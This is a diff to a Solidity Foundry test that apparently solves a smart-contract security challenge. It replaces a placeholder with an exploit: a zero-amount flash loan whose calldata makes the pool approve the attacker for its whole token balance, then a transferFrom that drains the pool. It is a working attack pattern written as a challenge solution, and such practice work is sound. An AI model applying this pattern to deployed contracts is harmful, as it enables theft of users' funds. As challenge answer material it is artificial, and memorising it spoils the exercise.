@@ -10,17 +10,19 @@ contract FreeTest is FreeFixture {
     }
 
     function test_free() public {
-
+        bytes memory data;
         // Start acting as the attacker for the remainder of the exploit
         vm.startPrank(attacker);
 
-        /**
-         * Code your exploit here
-         */
+        //After Borrow the money, the flashloan expects a calldata target.functionCall(data);
+        data = abi.encodeWithSignature("approve(address,uint256)", attacker, token.balanceOf(address(pool)));
+        console.logBytes(data);
+        pool.flashLoan(0,address(pool),address(token),data);
 
-        // Stop acting as the attacker
+        token.transferFrom(address(pool), attacker, token.balanceOf(address(pool)));
+
         vm.stopPrank();
-        // Perform exploit validations
+
         _assertions();
     }
 
